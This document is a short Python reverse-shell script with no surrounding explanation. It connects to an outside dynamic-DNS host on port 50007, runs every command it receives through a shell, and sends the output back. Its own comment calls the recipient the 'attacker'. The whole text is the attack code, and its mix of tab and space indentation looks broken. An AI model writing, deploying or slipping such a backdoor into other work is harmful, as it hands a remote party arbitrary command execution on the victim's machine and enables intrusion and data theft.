#!/usr/bin/python3.2


import socket
import subprocess

HOST = "shaana.dyndns.org"    # The remote host
PORT = 50007            # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
# loop forever
while 1:
    # recv command line param
    data = s.recv(1024)
    if str(data,"ascii") == "exit":
        break
    # execute command line
	proc = subprocess.Popen(str(data,"ascii"), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

	# grab output from commandline
    stdout_value = proc.stdout.read() + proc.stderr.read()
    # send back to attacker
    s.send(stdout_value)
# quit out afterwards and kill socket
s.close()



